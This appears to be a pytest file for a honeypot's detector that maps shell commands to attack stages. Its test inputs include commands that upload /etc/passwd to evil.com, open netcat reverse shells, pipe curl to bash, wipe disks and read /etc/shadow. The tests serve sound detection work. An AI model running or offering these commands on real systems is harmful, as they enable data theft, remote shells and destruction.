"""Tests for the TTP detector module."""

import pytest

from miragepot.ttp_detector import (
    AttackStage,
    TTPIndicator,
    SessionTTPState,
    init_ttp_state,
    analyze_command,
    get_attack_summary,
    is_high_risk_command,
    _matches_chain,
    _determine_current_stage,
)


class TestAttackStage:
    """Tests for the AttackStage enum."""

    def test_all_stages_exist(self):
        """Test all expected attack stages are defined."""
        expected = [
            "reconnaissance",
            "credential_access",
            "persistence",
            "privilege_escalation",
            "defense_evasion",
            "lateral_movement",
            "collection",
            "exfiltration",
            "impact",
            "unknown",
        ]
        for stage in expected:
            assert hasattr(AttackStage, stage.upper())

    def test_stage_values(self):
        """Test stage enum values."""
        assert AttackStage.RECONNAISSANCE.value == "reconnaissance"
        assert AttackStage.CREDENTIAL_ACCESS.value == "credential_access"
        assert AttackStage.PERSISTENCE.value == "persistence"


class TestTTPIndicator:
    """Tests for the TTPIndicator dataclass."""

    def test_to_dict(self):
        """Test conversion to dictionary."""
        indicator = TTPIndicator(
            technique_id="T1087.001",
            technique_name="Local Account Discovery",
            stage=AttackStage.RECONNAISSANCE,
            confidence="high",
            command="cat /etc/passwd",
            description="User account enumeration",
        )
        result = indicator.to_dict()

        assert result["technique_id"] == "T1087.001"
        assert result["technique_name"] == "Local Account Discovery"
        assert result["stage"] == "reconnaissance"
        assert result["confidence"] == "high"
        assert result["command"] == "cat /etc/passwd"
        assert result["description"] == "User account enumeration"
        assert "timestamp" in result

    def test_default_timestamp(self):
        """Test default timestamp is set."""
        indicator = TTPIndicator(
            technique_id="T1082",
            technique_name="System Information Discovery",
            stage=AttackStage.RECONNAISSANCE,
            confidence="medium",
            command="uname -a",
            description="System info",
        )
        assert indicator.timestamp is not None
        assert "Z" in indicator.timestamp  # ISO format with Z suffix


class TestSessionTTPState:
    """Tests for the SessionTTPState dataclass."""

    def test_init(self):
        """Test initialization with defaults."""
        state = SessionTTPState()
        assert state.commands_history == []
        assert state.indicators == []
        assert state.stages_seen == set()
        assert state.current_stage == AttackStage.UNKNOWN
        assert state.recon_commands == 0
        assert state.credential_commands == 0
        assert state.persistence_commands == 0

    def test_to_dict(self):
        """Test conversion to dictionary."""
        state = SessionTTPState()
        state.stages_seen.add("reconnaissance")
        state.recon_commands = 5
        result = state.to_dict()

        assert result["commands_history"] == []
        assert result["indicators"] == []
        assert "reconnaissance" in result["stages_seen"]
        assert result["current_stage"] == "unknown"
        assert result["recon_commands"] == 5


class TestInitTTPState:
    """Tests for init_ttp_state function."""

    def test_returns_session_ttp_state(self):
        """Test that init returns a SessionTTPState."""
        state = init_ttp_state()
        assert isinstance(state, SessionTTPState)

    def test_fresh_state(self):
        """Test that each call returns a fresh state."""
        state1 = init_ttp_state()
        state2 = init_ttp_state()
        state1.recon_commands = 10
        assert state2.recon_commands == 0


class TestAnalyzeCommand:
    """Tests for the analyze_command function."""

    # Reconnaissance tests
    def test_whoami(self):
        """Test whoami detection."""
        state = init_ttp_state()
        indicators = analyze_command("whoami", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1087.001" for i in indicators)
        assert "reconnaissance" in state.stages_seen

    def test_cat_etc_passwd(self):
        """Test cat /etc/passwd detection."""
        state = init_ttp_state()
        indicators = analyze_command("cat /etc/passwd", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1087.001" for i in indicators)
        assert any(i.confidence == "high" for i in indicators)

    def test_uname(self):
        """Test uname detection."""
        state = init_ttp_state()
        indicators = analyze_command("uname -a", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1082" for i in indicators)

    def test_ifconfig(self):
        """Test ifconfig detection."""
        state = init_ttp_state()
        indicators = analyze_command("ifconfig", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1016" for i in indicators)

    def test_ps_aux(self):
        """Test ps aux detection."""
        state = init_ttp_state()
        indicators = analyze_command("ps aux", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1057" for i in indicators)

    # Credential access tests
    def test_cat_etc_shadow(self):
        """Test cat /etc/shadow detection."""
        state = init_ttp_state()
        indicators = analyze_command("cat /etc/shadow", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1003.008" for i in indicators)
        assert "credential_access" in state.stages_seen

    def test_grep_password(self):
        """Test grep password detection."""
        state = init_ttp_state()
        indicators = analyze_command("grep -r password /var/www", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1552.001" for i in indicators)

    def test_cat_env_file(self):
        """Test cat .env file detection."""
        state = init_ttp_state()
        indicators = analyze_command("cat /var/www/html/.env", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1552.001" for i in indicators)

    def test_cat_ssh_key(self):
        """Test cat id_rsa detection."""
        state = init_ttp_state()
        indicators = analyze_command("cat /root/.ssh/id_rsa", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1552.004" for i in indicators)

    # Persistence tests
    def test_crontab_edit(self):
        """Test crontab -e detection."""
        state = init_ttp_state()
        indicators = analyze_command("crontab -e", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1053.003" for i in indicators)
        assert "persistence" in state.stages_seen

    def test_ssh_key_injection(self):
        """Test SSH key injection detection."""
        state = init_ttp_state()
        indicators = analyze_command(
            "echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys", state
        )
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1098.004" for i in indicators)

    def test_useradd(self):
        """Test useradd detection."""
        state = init_ttp_state()
        indicators = analyze_command("useradd backdoor", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1136.001" for i in indicators)

    def test_bashrc_backdoor(self):
        """Test bashrc modification detection."""
        state = init_ttp_state()
        indicators = analyze_command(
            "echo 'nc -e /bin/bash attacker 4444' >> ~/.bashrc", state
        )
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1546.004" for i in indicators)

    # Privilege escalation tests
    def test_sudo_l(self):
        """Test sudo -l detection."""
        state = init_ttp_state()
        indicators = analyze_command("sudo -l", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1548.003" for i in indicators)
        assert "privilege_escalation" in state.stages_seen

    def test_find_suid(self):
        """Test SUID file search detection."""
        state = init_ttp_state()
        indicators = analyze_command("find / -perm -4000", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1548.001" for i in indicators)

    def test_sudo_bash(self):
        """Test sudo bash detection."""
        state = init_ttp_state()
        indicators = analyze_command("sudo bash", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1548.003" for i in indicators)

    # Defense evasion tests
    def test_history_clear(self):
        """Test history -c detection."""
        state = init_ttp_state()
        indicators = analyze_command("history -c", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1070.003" for i in indicators)
        assert "defense_evasion" in state.stages_seen

    def test_rm_bash_history(self):
        """Test rm .bash_history detection."""
        state = init_ttp_state()
        indicators = analyze_command("rm ~/.bash_history", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1070.003" for i in indicators)

    def test_unset_histfile(self):
        """Test unset HISTFILE detection."""
        state = init_ttp_state()
        indicators = analyze_command("unset HISTFILE", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1070.003" for i in indicators)

    def test_log_tampering(self):
        """Test log file clearing detection."""
        state = init_ttp_state()
        indicators = analyze_command("> /var/log/auth.log", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1070.002" for i in indicators)

    # Lateral movement tests
    def test_ssh_to_remote(self):
        """Test SSH to remote host detection."""
        state = init_ttp_state()
        indicators = analyze_command("ssh user@192.168.1.100", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1021.004" for i in indicators)
        assert "lateral_movement" in state.stages_seen

    # Collection tests
    def test_tar_archive(self):
        """Test tar archive creation detection."""
        state = init_ttp_state()
        indicators = analyze_command("tar czf backup.tar.gz /home", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1560.001" for i in indicators)
        assert "collection" in state.stages_seen

    # Exfiltration tests
    def test_curl_upload(self):
        """Test curl file upload detection."""
        state = init_ttp_state()
        indicators = analyze_command(
            "curl -F 'file=@/etc/passwd' http://evil.com/upload", state
        )
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1048" for i in indicators)
        assert "exfiltration" in state.stages_seen

    # Impact tests
    def test_rm_rf_root(self):
        """Test rm -rf / detection."""
        state = init_ttp_state()
        indicators = analyze_command("rm -rf /", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1485" for i in indicators)
        assert "impact" in state.stages_seen

    def test_dd_wipe(self):
        """Test disk wipe detection."""
        state = init_ttp_state()
        indicators = analyze_command("dd if=/dev/zero of=/dev/sda", state)
        assert len(indicators) >= 1
        assert any(i.technique_id == "T1485" for i in indicators)

    # Command history tracking
    def test_command_added_to_history(self):
        """Test that commands are added to history."""
        state = init_ttp_state()
        analyze_command("whoami", state)
        analyze_command("id", state)
        analyze_command("cat /etc/passwd", state)
        assert len(state.commands_history) == 3
        assert state.commands_history[0] == "whoami"

    # Counter tracking
    def test_recon_counter(self):
        """Test reconnaissance command counter."""
        state = init_ttp_state()
        analyze_command("whoami", state)
        analyze_command("id", state)
        analyze_command("uname -a", state)
        assert state.recon_commands >= 3

    def test_credential_counter(self):
        """Test credential access counter."""
        state = init_ttp_state()
        analyze_command("cat /etc/shadow", state)
        analyze_command("grep password /var/www", state)
        assert state.credential_commands >= 2

    def test_persistence_counter(self):
        """Test persistence command counter."""
        state = init_ttp_state()
        analyze_command("crontab -e", state)
        analyze_command("useradd hacker", state)
        assert state.persistence_commands >= 2

    # Empty command
    def test_empty_command(self):
        """Test empty command returns no indicators."""
        state = init_ttp_state()
        indicators = analyze_command("", state)
        assert indicators == []

    def test_whitespace_command(self):
        """Test whitespace-only command returns no indicators."""
        state = init_ttp_state()
        indicators = analyze_command("   ", state)
        assert indicators == []

    # Benign commands
    def test_ls_no_detection(self):
        """Test that simple ls doesn't trigger high-confidence alerts."""
        state = init_ttp_state()
        indicators = analyze_command("ls", state)
        # ls alone shouldn't trigger high-confidence indicators
        high_conf = [i for i in indicators if i.confidence == "high"]
        assert len(high_conf) == 0


class TestCommandChains:
    """Tests for command chain detection."""

    def test_matches_chain_simple(self):
        """Test simple chain matching."""
        history = ["whoami", "id", "cat /etc/passwd"]
        chain = ["whoami", "id", "cat /etc/passwd"]
        assert _matches_chain(history, chain) is True

    def test_matches_chain_with_gaps(self):
        """Test chain matching with commands in between."""
        history = ["whoami", "ls", "id", "pwd", "cat /etc/passwd"]
        chain = ["whoami", "id", "cat /etc/passwd"]
        assert _matches_chain(history, chain) is True

    def test_matches_chain_substring(self):
        """Test chain matching with substring patterns."""
        history = ["whoami", "id -a", "cat /etc/passwd"]
        chain = ["whoami", "id", "cat /etc/passwd"]
        assert _matches_chain(history, chain) is True

    def test_no_match_wrong_order(self):
        """Test chain doesn't match if order is wrong."""
        history = ["cat /etc/passwd", "id", "whoami"]
        chain = ["whoami", "id", "cat /etc/passwd"]
        assert _matches_chain(history, chain) is False

    def test_no_match_missing_command(self):
        """Test chain doesn't match if command is missing."""
        history = ["whoami", "id"]
        chain = ["whoami", "id", "cat /etc/passwd"]
        assert _matches_chain(history, chain) is False

    def test_recon_chain_detection(self):
        """Test reconnaissance chain detection."""
        state = init_ttp_state()
        analyze_command("whoami", state)
        analyze_command("id", state)
        indicators = analyze_command("cat /etc/passwd", state)

        # Should detect the chain
        chain_indicators = [i for i in state.indicators if "chain" in i.command.lower()]
        assert len(chain_indicators) >= 1

    def test_download_execute_chain(self):
        """Test download and execute chain detection."""
        state = init_ttp_state()
        analyze_command("wget http://evil.com/malware.sh", state)
        indicators = analyze_command("chmod +x malware.sh", state)

        chain_indicators = [i for i in state.indicators if "chain" in i.command.lower()]
        assert len(chain_indicators) >= 1


class TestDetermineCurrentStage:
    """Tests for _determine_current_stage function."""

    def test_unknown_when_empty(self):
        """Test returns unknown when no stages seen."""
        state = SessionTTPState()
        assert _determine_current_stage(state) == AttackStage.UNKNOWN

    def test_recon_stage(self):
        """Test reconnaissance stage detection."""
        state = SessionTTPState()
        state.stages_seen.add("reconnaissance")
        assert _determine_current_stage(state) == AttackStage.RECONNAISSANCE

    def test_highest_priority_stage(self):
        """Test highest priority stage is returned."""
        state = SessionTTPState()
        state.stages_seen.add("reconnaissance")
        state.stages_seen.add("persistence")
        state.stages_seen.add("impact")
        # Impact should have highest priority
        assert _determine_current_stage(state) == AttackStage.IMPACT

    def test_exfiltration_over_recon(self):
        """Test exfiltration prioritized over reconnaissance."""
        state = SessionTTPState()
        state.stages_seen.add("reconnaissance")
        state.stages_seen.add("exfiltration")
        assert _determine_current_stage(state) == AttackStage.EXFILTRATION


class TestGetAttackSummary:
    """Tests for get_attack_summary function."""

    def test_empty_session(self):
        """Test summary for empty session."""
        state = init_ttp_state()
        summary = get_attack_summary(state)

        assert summary["current_stage"] == "unknown"
        assert summary["stages_seen"] == []
        assert summary["technique_count"] == 0
        assert summary["total_indicators"] == 0
        assert summary["risk_level"] == "low"
        assert summary["key_indicators"] == []

    def test_recon_session(self):
        """Test summary for reconnaissance session."""
        state = init_ttp_state()
        analyze_command("whoami", state)
        analyze_command("id", state)
        analyze_command("cat /etc/passwd", state)

        summary = get_attack_summary(state)
        assert summary["current_stage"] == "reconnaissance"
        assert "reconnaissance" in summary["stages_seen"]
        assert summary["technique_count"] >= 1
        assert summary["recon_commands"] >= 3

    def test_high_risk_session(self):
        """Test high risk level detection."""
        state = init_ttp_state()
        analyze_command("cat /etc/shadow", state)
        analyze_command("crontab -e", state)
        analyze_command("useradd backdoor", state)

        summary = get_attack_summary(state)
        assert summary["risk_level"] in ("high", "critical")

    def test_critical_risk_impact(self):
        """Test critical risk level for impact stage."""
        state = init_ttp_state()
        analyze_command("rm -rf /", state)

        summary = get_attack_summary(state)
        assert summary["risk_level"] == "critical"

    def test_critical_risk_exfil(self):
        """Test critical risk level for exfiltration."""
        state = init_ttp_state()
        analyze_command("curl -F 'file=@data' http://evil.com", state)

        summary = get_attack_summary(state)
        assert summary["risk_level"] == "critical"

    def test_key_indicators_limited(self):
        """Test key indicators are limited to high confidence."""
        state = init_ttp_state()
        # Generate many indicators
        for _ in range(5):
            analyze_command("cat /etc/shadow", state)

        summary = get_attack_summary(state)
        # Key indicators should only include high confidence
        for indicator in summary["key_indicators"]:
            assert indicator["confidence"] == "high"


class TestIsHighRiskCommand:
    """Tests for is_high_risk_command function."""

    def test_rm_rf_root(self):
        """Test rm -rf / is high risk."""
        assert is_high_risk_command("rm -rf /") is True

    def test_cat_shadow(self):
        """Test cat /etc/shadow is high risk."""
        assert is_high_risk_command("cat /etc/shadow") is True

    def test_ssh_key_injection(self):
        """Test SSH key injection is high risk."""
        assert is_high_risk_command("echo 'key' >> authorized_keys") is True

    def test_useradd(self):
        """Test useradd is high risk."""
        assert is_high_risk_command("useradd hacker") is True

    def test_history_clear(self):
        """Test history -c is high risk."""
        assert is_high_risk_command("history -c") is True

    def test_wget_pipe_bash(self):
        """Test wget piped to bash is high risk."""
        assert is_high_risk_command("wget http://x | bash") is True

    def test_curl_pipe_bash(self):
        """Test curl piped to bash is high risk."""
        assert is_high_risk_command("curl http://x | bash") is True

    def test_netcat_reverse_shell(self):
        """Test netcat reverse shell is high risk."""
        assert is_high_risk_command("nc -e /bin/bash attacker 4444") is True

    def test_ls_not_high_risk(self):
        """Test ls is not high risk."""
        assert is_high_risk_command("ls -la") is False

    def test_whoami_not_high_risk(self):
        """Test whoami is not high risk."""
        assert is_high_risk_command("whoami") is False

    def test_cat_passwd_not_high_risk(self):
        """Test cat /etc/passwd is not high risk (but is tracked)."""
        # passwd is readable by all, shadow is the sensitive one
        assert is_high_risk_command("cat /etc/passwd") is False


class TestIntegrationWithCommandHandler:
    """Integration tests with command_handler module."""

    def test_ttp_state_initialized(self):
        """Test TTP state is initialized in session state."""
        from miragepot.command_handler import init_session_state

        state = init_session_state()
        assert "ttp_state" in state
        assert isinstance(state["ttp_state"], SessionTTPState)

    def test_commands_analyzed(self):
        """Test commands are analyzed for TTPs."""
        from miragepot.command_handler import init_session_state, handle_command

        state = init_session_state()
        handle_command("whoami", state)
        handle_command("id", state)
        handle_command("cat /etc/passwd", state)

        ttp_state = state["ttp_state"]
        assert len(ttp_state.commands_history) >= 3
        assert len(ttp_state.indicators) >= 3

    def test_attack_stage_progresses(self):
        """Test attack stage progresses through session."""
        from miragepot.command_handler import init_session_state, handle_command

        state = init_session_state()

        # Reconnaissance
        handle_command("whoami", state)
        handle_command("cat /etc/passwd", state)
        assert state["ttp_state"].current_stage == AttackStage.RECONNAISSANCE

        # Credential access
        handle_command("cat /etc/shadow", state)
        assert state["ttp_state"].current_stage == AttackStage.CREDENTIAL_ACCESS

        # Persistence
        handle_command("useradd backdoor", state)
        assert state["ttp_state"].current_stage == AttackStage.PERSISTENCE

    def test_summary_available(self):
        """Test attack summary is available."""
        from miragepot.command_handler import init_session_state, handle_command

        state = init_session_state()
        handle_command("whoami", state)
        handle_command("cat /etc/shadow", state)

        summary = get_attack_summary(state["ttp_state"])
        assert "current_stage" in summary
        assert "risk_level" in summary
        assert "technique_count" in summary
